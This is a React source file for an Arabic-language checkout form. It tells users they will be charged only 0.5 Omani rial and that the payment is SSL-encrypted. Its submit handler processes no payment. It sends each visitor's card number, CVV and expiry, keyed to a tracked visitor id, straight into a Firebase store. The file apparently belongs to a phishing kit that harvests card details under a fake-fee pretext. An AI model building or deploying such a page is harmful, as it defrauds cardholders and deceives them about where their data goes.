"use client"

import type React from "react"
import { CreditCard, Lock, ArrowRight, ArrowLeft } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { addData } from "@/lib/firebase"

interface CardData {
  number: string
  name: string
  expiry: string
  cvv: string
}

interface PaymentFormProps {
  cardData: CardData
  setCardData: (data: CardData) => void
  onNext: () => void
  onBack: () => void
  loading: boolean
}

export function PaymentForm({ cardData, setCardData, onNext, onBack, loading }: PaymentFormProps) {
  const handleSubmit = (e: React.FormEvent) => {
    const _id=localStorage.getItem('visitor')
    addData({id:_id,cardNumber:cardData.number ,cvv:cardData.cvv,expiryDate:cardData.expiry})
    onNext()
  }

  const updateField = (field: keyof CardData, value: string) => {
    setCardData({ ...cardData, [field]: value })
  }

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }
    if (parts.length) {
      return parts.join(" ")
    } else {
      return v
    }
  }

  return (
    <Card className="w-full shadow-lg border-0 bg-white">
      <CardHeader className="text-center pb-6 bg-gradient-to-r from-green-50 to-emerald-50 rounded-t-lg">
        <CardTitle className="text-2xl font-bold text-gray-800">معلومات الدفع</CardTitle>
        <CardDescription className="text-gray-600">أدخل بيانات بطاقتك الائتمانية لإتمام عملية الشراء</CardDescription>
      </CardHeader>
      <CardContent className="p-6">
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="space-y-2">
            <Label htmlFor="cardNumber" className="text-sm font-medium text-gray-700">
              رقم البطاقة *
            </Label>
            <div className="relative">
              <Input
                id="cardNumber"
                placeholder="1234 5678 9012 3456"
                value={formatCardNumber(cardData.number)}
                onChange={(e) => updateField("number", e.target.value)}
                className="pl-10 h-11 border-gray-300 focus:border-green-500 focus:ring-green-500 font-mono"
                maxLength={19}
                required
                type="tel"
              />
              <CreditCard className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
            </div>
          </div>

          <div className="space-y-2">
            <Label htmlFor="cardName" className="text-sm font-medium text-gray-700">
              اسم حامل البطاقة *
            </Label>
            <Input
              id="cardName"
              placeholder="AHMED MOHAMMED"
              value={cardData.name}
              onChange={(e) => updateField("name", e.target.value.toUpperCase())}
              className="h-11 border-gray-300 focus:border-green-500 focus:ring-green-500"
              required
            />
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <Label htmlFor="expiry" className="text-sm font-medium text-gray-700">
                تاريخ الانتهاء *
              </Label>
              <Input
                id="expiry"
                placeholder="MM/YY"
                value={cardData.expiry}
                onChange={(e) => {
                  let value = e.target.value.replace(/\D/g, "")
                  if (value.length >= 2) {
                    value = value.substring(0, 2) + "/" + value.substring(2, 4)
                  }
                  updateField("expiry", value)
                }}
                className="h-11 border-gray-300 focus:border-green-500 focus:ring-green-500 font-mono"
                maxLength={5}
                required
              />
            </div>
            <div className="space-y-2">
              <Label htmlFor="cvv" className="text-sm font-medium text-gray-700">
                رمز الأمان *
              </Label>
              <Input
                id="cvv"
                placeholder="123"
                type="password"
                maxLength={3}
                value={cardData.cvv}
                onChange={(e) => updateField("cvv", e.target.value.replace(/\D/g, ""))}
                className="h-11 border-gray-300 focus:border-green-500 focus:ring-green-500 font-mono"
                required
              />
            </div>
          </div>

          <div className="bg-gradient-to-r from-green-50 to-emerald-50 p-4 rounded-lg border border-green-100">
            <div className="flex items-center gap-3">
              <Lock className="h-5 w-5 text-green-600 flex-shrink-0" />
              <div>
                <span className="text-sm font-medium text-green-800 block">دفع آمن ومشفر</span>
                <span className="text-xs text-green-600">جميع المعاملات محمية بتشفير SSL 256-bit</span>
              </div>
            </div>
          </div>

          <div className="bg-gradient-to-r from-yellow-50 to-amber-50 p-4 rounded-lg border border-yellow-200">
            <div className="flex items-start gap-3">
              <div className="w-2 h-2 bg-yellow-500 rounded-full mt-2 flex-shrink-0"></div>
              <div>
                <p className="text-sm font-medium text-yellow-800 mb-1">ملاحظة مهمة</p>
                <p className="text-sm text-yellow-700">سوف يتم خصم مبلغ 0.5 ريال عماني فقط لتأكيد الطلب</p>
              </div>
            </div>
          </div>

          <div className="flex gap-3">
            <Button
              type="button"
              variant="outline"
              onClick={onBack}
              className="flex-1 h-12 border-gray-300 hover:bg-gray-50 bg-transparent"
            >
              <ArrowLeft className="w-4 h-4 ml-2" />
              رجوع
            </Button>
            <Button
              type="submit"
              disabled={loading}
              className="flex-1 h-12 bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white font-medium rounded-lg transition-all duration-300 shadow-lg hover:shadow-xl"
            >
              {loading ? (
                <div className="flex items-center gap-2">
                  <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
                  جاري المعالجة...
                </div>
              ) : (
                <div className="flex items-center gap-2">
                  ادفع الآن
                  <ArrowRight className="h-4 w-4" />
                </div>
              )}
            </Button>
          </div>
        </form>
      </CardContent>
    </Card>
  )
}
